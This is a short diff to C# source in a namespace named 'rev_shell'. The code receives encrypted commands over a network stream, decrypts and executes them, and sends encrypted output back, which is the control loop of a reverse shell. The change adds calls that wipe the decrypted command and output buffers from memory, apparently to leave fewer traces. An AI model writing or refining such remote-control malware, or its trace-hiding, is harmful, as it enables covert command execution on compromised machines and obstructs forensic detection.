@@ -76,6 +76,7 @@ namespace rev_shell
                             byte[] decryptedCtrl = Enx(buffer, bytesRead);
                             string ctrl = Encoding.UTF8.GetString(decryptedCtrl, 0, decryptedCtrl.Length).Trim();
                             //Console.WriteLine(String.Format("Received ctrl: {0}", ctrl));
+		            Array.Clear(decryptedCtrl, 0, decryptedCtrl.Length);
 
                             
                             string output = E_ctrl(ctrl);
@@ -83,6 +84,9 @@ namespace rev_shell
                             
                             byte[] encryptedResponse = Enx(Encoding.UTF8.GetBytes(output));
                             stream.Write(encryptedResponse, 0, encryptedResponse.Length);
+
+		            byte[] outputBytes = Encoding.UTF8.GetBytes(output);
+			    Array.Clear(outputBytes, 0, outputBytes.Length);
                         }
                     }
                 }
